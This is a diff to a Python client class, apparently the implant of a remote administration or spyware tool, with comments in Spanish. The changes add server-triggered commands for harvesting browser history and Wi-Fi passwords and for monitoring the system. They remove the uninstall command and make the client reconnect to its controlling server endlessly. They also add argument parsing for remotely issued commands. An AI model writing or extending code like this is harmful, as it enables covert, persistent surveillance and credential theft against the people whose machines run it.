@@ -31,8 +31,10 @@ class Client:
             "processes": f.get_processes,
             "drives": f.get_drives,
             "files": f.get_files,
-            "download": f.download_file,
-            "upload": f.upload_file,
+            "history": f.get_browser_history,
+            "get_wifi_passwords": f.get_wifi_passwords,
+            "monitor_system": f.monitor_system,
+            "download": f.see_file,
             "network": f.get_network,
             "services": f.get_services,
             "kill": f.kill_process,
@@ -41,7 +43,6 @@ class Client:
             "environment": f.get_environment,
             "installed_software": f.get_installed_software,
             "network_connections": f.get_network_connections,
-            "Uninstall tool": self.setup.uninstall,
         }
 
     def listen_for_commands(self):
@@ -85,21 +86,23 @@ class Client:
             self.client_socket.close()
 
     def connect(self):
-        try:
-            self.client_socket = socket.create_connection((self.host, self.port))
+        while True:
+            try:
+                self.client_socket = socket.create_connection((self.host, self.port))
 
-            # Enviar mensaje inicial
-            initial_data = pickle.dumps({"status": "connected"})
-            self.client_socket.sendall(len(initial_data).to_bytes(4, 'big'))
-            self.client_socket.sendall(initial_data)
+                # Enviar mensaje inicial
+                initial_data = pickle.dumps({"status": "connected"})
+                self.client_socket.sendall(len(initial_data).to_bytes(4, 'big'))
+                self.client_socket.sendall(initial_data)
 
-            self.status_message = "[+] Connected to the server."
-            print(self.status_message)
-            self.listen_for_commands()
-            return True
-        except Exception as e:
-            self.status_message = f"[!] Error connecting to the server: {e}"
-            return False
+                self.status_message = "[+] Connected to the server."
+                print(self.status_message)
+                self.listen_for_commands()
+
+            except Exception as e:
+                self.status_message = f"[!] Error connecting to the server: {e}"
+                print(self.status_message)
+                print("Reintentando...")
 
     def close(self):
         if self.client_socket:
@@ -114,10 +117,26 @@ class Client:
     def execute_command(self, command):
         # Aquí puedes procesar los comandos recibidos.
         try:
-            if command in self.commands:
-                return self.commands[command]()
+            # Separar el comando y sus argumentos
+            parts = command.split(' ')
+            cmd = parts[0]
+            args = parts[1:]  # El resto son argumentos
+
+            # Verificar si el comando existe en el diccionario
+            if cmd in self.commands:
+                # Obtener la función correspondiente
+                command_function = self.commands[cmd]
+
+                # Llamar a la función con los argumentos, si los hay
+                if cmd in self.command_args:
+                    # Si el comando espera argumentos, pasarlos
+                    if args:
+                        return command_function(*args)
+                    else:
+                        return command_function()
+                else:
+                    return command_function()
             else:
-                return f"Comando no válido: {command}"
+                return f"Comando no válido: {cmd}"
         except Exception as e:
             return f"Error al ejecutar comando: {e}"
-        # Por ejemplo, podrías usar 'os' para ejecutar comandos en el sistema.
